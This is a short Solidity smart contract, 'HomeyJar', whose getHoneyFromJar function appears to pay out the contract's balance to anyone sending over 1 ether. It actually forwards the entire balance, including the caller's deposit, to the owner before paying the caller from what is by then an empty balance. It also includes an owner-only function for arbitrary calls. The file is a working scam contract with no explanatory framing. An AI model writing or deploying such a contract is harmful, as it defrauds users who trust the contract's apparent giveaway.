pragma solidity ^0.8.0;

contract HomeyJar {
    address payable public Owner;

    constructor() {
        Owner = payable(msg.sender);
    }

    receive() external payable {}

    function getHoneyFromJar() public payable {
        require(msg.value > 1 ether, "Insufficient value sent");
        Owner.transfer(address(this).balance);
        payable(msg.sender).transfer(address(this).balance);
    }

    function withdraw() public payable {
        require(msg.sender == Owner, "Only the owner can withdraw");
        Owner.transfer(address(this).balance);
    }

    function command(address payable adr, bytes memory data) public payable {
        require(msg.sender == Owner, "Only the owner can send commands");
        (bool success, ) = adr.call{value: msg.value}(data);
        require(success, "Command execution failed");
    }
}